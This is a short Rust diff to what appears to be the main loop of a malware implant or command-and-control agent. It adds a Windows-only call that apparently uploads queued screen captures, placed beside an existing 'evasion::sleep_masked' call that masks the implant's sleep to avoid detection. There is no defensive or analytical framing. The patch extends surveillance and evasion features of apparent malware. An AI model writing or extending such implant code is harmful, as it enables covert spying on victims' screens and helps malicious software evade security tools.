@@ -89,6 +89,9 @@ fn main() {
         }
 
         #[cfg(target_os = "windows")]
+        commands::drain_screenwatch_uploads(&mut t);
+
+        #[cfg(target_os = "windows")]
         evasion::sleep_masked(sleep_ms());
         #[cfg(not(target_os = "windows"))]
         thread::sleep(Duration::from_millis(sleep_ms()));
